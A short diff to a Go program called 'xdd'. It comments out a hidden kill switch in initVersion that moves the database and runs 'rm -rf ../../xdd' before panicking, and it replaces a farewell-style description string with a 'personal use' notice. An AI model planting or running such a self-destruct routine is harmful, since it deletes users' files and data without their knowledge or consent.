@@ -12,16 +12,16 @@ import (
 )
 
 var version = "2021082709"
-var describe = "江湖再见，跑路了～"
+var describe = "个人使用版，使用请谨慎～"
 var AppName = "xdd"
 var pname = regexp.MustCompile(`/([^/\s]+)`).FindStringSubmatch(os.Args[0])[1]
 
 func initVersion() {
-	if !Cdle {
-		cmd("mv ../../xdd/.xdd.db ../../.xdd.db", &Sender{})
-		cmd("rm -rf ../../xdd", &Sender{})
-		panic("bye bye")
-	}
+//	if !Cdle {
+//		cmd("mv ../../xdd/.xdd.db ../../.xdd.db", &Sender{})
+//		cmd("rm -rf ../../xdd", &Sender{})
+//		panic("bye bye")
+//	}
 	if Config.Version != "" {
 		version = Config.Version
 	}
